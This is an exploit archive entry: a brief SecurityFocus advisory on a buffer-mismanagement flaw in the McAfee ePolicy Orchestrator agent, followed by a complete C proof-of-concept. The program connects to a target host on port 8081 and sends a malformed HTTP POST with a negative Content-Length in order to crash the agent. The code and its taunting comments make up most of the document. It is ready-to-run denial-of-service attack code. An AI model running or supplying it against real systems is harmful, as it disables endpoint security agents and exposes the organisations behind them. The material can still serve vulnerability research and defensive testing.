source: http://www.securityfocus.com/bid/9476/info

The McAfee ePolicy Orchestrator agent has been reported to a buffer management vulnerability that may be exploited to crash the affected agent. Although unconfirmed, it has been reported that the issue may also allow a remote attacker to trigger a buffer overflow vulnerability.

The issue reportedly presents itself, because certain values in HTTP POST headers processed by the ePolicy Orchestrator are not sufficiently sanitized.

/*

 >McAfee ePolicy Orchestrator Agent HTTP POST Buffer Mismanagement 
Vulnerability PoC

 >Ref            :  http://securityfocus.com/bid/9476
 >discovered by  :  cyber_flash@hotmail.com


"
The McAfee ePolicy Orchestrator agent has been reported to a buffer 
management vulnerability that may be exploited to crash the affected 
agent. Although unconfirmed, it has
 been reported that the issue may also allow a remote attacker to trigger 
a buffer overflow vulnerability.

The issue reportedly presents itself, because certain values in HTTP POST 
headers processed by the ePolicy Orchestrator are not sufficiently 
sanitized.

"


>Hi NA-eye ;-) . Hurry-yup . relase a patch guyz !


                                 + PoC by Shashank Pandey a.k.a 
G0D_0F_z10N +

> Greetz to my dewd 'Arun Jose' for 'Grass is not addictive..thing' while 
i wuz writing this..!

> lame coding ..dont think too much abt it...



*/


#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment (lib,"ws2_32")





int main(int argc, char *argv[])
{


  WSADATA wsaData;




      int s;

      struct hostent *yo;
      struct sockaddr_in wutever;

                char badb0y[] =

                "POST /spipe/pkg?AgentGuid={}&Source=Agent_3.0.0 
HTTP/1.0\r\n"
                "Accept: application/octet-stream\r\n"
                "Accept-Language: en-us\r\n"
                "Content-Type: application/octet-stream\r\n"
                "User-Agent: Godzilla/6.9 (compatible; SPIPE/3.0; 
Windows)\r\n"
                "Host: EPO_DIE\r\n"
                "Content-Length: -1\r\n"
                "Connection: Keep-Alive\r\n\r\n";

printf("\n--------------------------------- ");
 printf("\n McAfee ePO agent overflow PoC    \n");
 printf("+++++++++++++++++++++++++++++++++\n");
 printf(" by Shashank Pandey              \n");
 printf(" (reach_shash@linuxmail.org)     \n");
 printf("--------------------------------- \n");



if(WSAStartup(0x0101,&wsaData)!=0) {
      printf("Error :Cudn't initiate winsock!");
      return 0;
      }


if(argc<2)

{printf("\nUsage : %s <I.P./Hostname>\n\n",argv[0]);
  exit(0);}




  if ( (yo = gethostbyname(argv[1]))==0)
  {
    printf("error: can't resolve '%s'",argv[1]);
    return 1;
  }





  wutever.sin_port = htons(8081); // ePO agent uses the HTTP protocol to 
communicate on port 8081
  wutever.sin_family = AF_INET;
  wutever.sin_addr = *((struct in_addr *)yo->h_addr);

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
    printf("error: can't create socket");
    return 1;
  }


  if ((connect(s, (struct sockaddr *) &wutever, sizeof(wutever))) == -1){
    printf("Error:Cudn't Connect\r\n");
    return 1;
  }



   printf("\r\nCrashing the client...< it's a PoC dewd ;-) >\n");

  send(s,badb0y,strlen(badb0y),0);



  closesocket(s);


  WSACleanup();





return 1;
}